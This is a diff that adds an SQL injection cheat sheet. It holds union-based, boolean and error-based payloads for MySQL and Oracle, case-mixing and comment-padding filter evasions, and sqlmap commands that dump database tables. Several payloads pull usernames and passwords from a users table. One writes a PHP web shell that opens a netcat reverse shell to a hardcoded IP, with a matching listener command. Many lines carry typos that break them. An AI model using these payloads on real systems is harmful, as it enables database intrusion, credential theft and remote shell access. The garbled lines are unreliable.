@@ -1,0 +1,86 @@
+1' and 1=1 <- True
+--------------------------
+1' and 1=0 <- False
+
+1' order by 1 <- True
+
+1' order by 1000 <- False
+
+1' union select database(),2 from information_schema.tables
+
+1' unnion select table_name,2 from information_schema.tables
+
+1' union select username,password from users
+
+1 union select table_name,2 form information_schema.tables where table_schema='hashcode'
+
+==================================================
+and 1=1
+aNd 222=222
+anD 111=111
+orDeR bY 1
+-----------
+union select 1,2 %23
+uNioN+sEleCt+1,2+%23
+uNioN/**/sEleCt/**/1,2/**/%23
+/*
+--
+; --
+; /*
+; //
+
+=================
+-1'+uNioN/**/sEleCt/**/table_name,2+fRom+information_schema.tables%23Submit=Submit#
+==============
+-1'+uNioN/**/sEleCt/**/table_name,2+fRom+information_schema.tables+limit+1,1%23Submit=Submit#
+========================
+-1'+uNioN/**/sEleCt/**/table_name,2+fRom+information_schema.tables+where+table_schema=''+limit+1,1%23Submit=Submit#
+-------------------------
+union select '<?passthru("nc -e /bin/sh 10.20.14.208 8080");?>',null into outfile '/tmp/reverse.php'
+
+# nc -vv -l -p 8080
+-----------------------------------
+HOW TO USE SQLMAP TOOL:
+
+sqlmap -u url --current-db
+==================================
+sqlmap -u url -D goodmorning_db --tables --random-agent
+============================================
+sqlmap -u url -D goodmorning_db -T users--dump --threads=5 --random-agent
+===============================================
+sqlmap -u "example.com/vulnerable.php?id=1" --level=3 --risk=5 --tamper=space2comment,randomcase,between-threads=5 -random-agent
+=================================
+sqlmap -u "example.com" --curent-db --random-agent --level=5 --threads = 5
+================================
+sqlmap -u "example.com" --level=5 --risk=3  --random-agent  --threads = 5
+===============
+
+
+MYSQL:
+id=1' / id=1"
+id=1' order by 1000
+id=1 union all select 1,2,3
+id=1 union all select 1,@@version,3
+id=1 union all select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()
+id=1 union all select 1,2,,group_concat(column_name) from information_schema.columns where table_name = "users"
+id=1 union all select 1,2,group_concat(uname,":",pass) from users
+=====================================
+Error Based sql Injection:
+id=-1 AND exctractvalue("blahh",(select concat(":",column_name)from information_schema.columns where table_name = "users" limit0,1))
+------------------------------
+id=1 AND exctractvalue("blahh",(select concat(";",uname,":",pass) from users limit 0,1))
+================================================
+Union Based Sql Injection:
+id=1 union all select 1,2
+id=1 union all select 1,version()
+id=1 union all selectt 1,table_name from information_schema.tables where table_schema !='pg_catalog' and table_schema != 'information_schema' offset 0
+id=1 union all select 1,column_name from information_schema.columns where table_name = 'users' offset 0
+id=1 union all select 1,concat(username,':',password) from users offset 0
+======================================
+Oracle
+
+id=1'union select(select banner from v$version WHERE ROWNUM = 1),null from dual--
+--------------------------------------------
+id=1' union all select LISTAGG(table_name,',')within group(ORDER BY table_name),null from all_tables where tablespace_name = 'USERS'--
+---------------------------------------------
+id=1' union all select LISTAGG(column_name,',')within group(ORDER BY column_name),null from all_tab_columns where table_name = 'EMPLOYEES'--
